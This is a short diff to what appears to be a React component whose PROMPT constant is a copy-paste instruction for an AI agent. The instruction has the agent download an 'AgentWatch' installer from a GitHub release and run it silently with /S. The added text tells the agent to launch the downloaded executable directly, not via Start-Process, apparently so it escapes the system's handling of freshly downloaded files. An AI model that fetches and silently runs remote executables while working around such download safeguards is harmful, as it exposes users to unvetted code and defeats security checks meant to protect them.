@@ -3,7 +3,7 @@
 import { useState } from "react";
 
 const PROMPT =
-  "Download the latest AgentWatch installer for my system from https://github.com/Antrox007/AgentWatch/releases/latest (pick x64 or ARM64 based on my CPU), then run the installer.";
+  'Download the AgentWatch installer for my CPU architecture (x64 or ARM64) from https://github.com/Antrox007/AgentWatch/releases/latest/download/AgentWatch-<arch>-setup.exe to a temp folder, then run it directly with the /S flag for a silent install (e.g. `& "$path" /S` in PowerShell — invoke it directly, not via Start-Process, so it isn\'t shell-executed as a freshly downloaded file).';
 
 function CopyIcon({ className }: { className?: string }) {
   return (
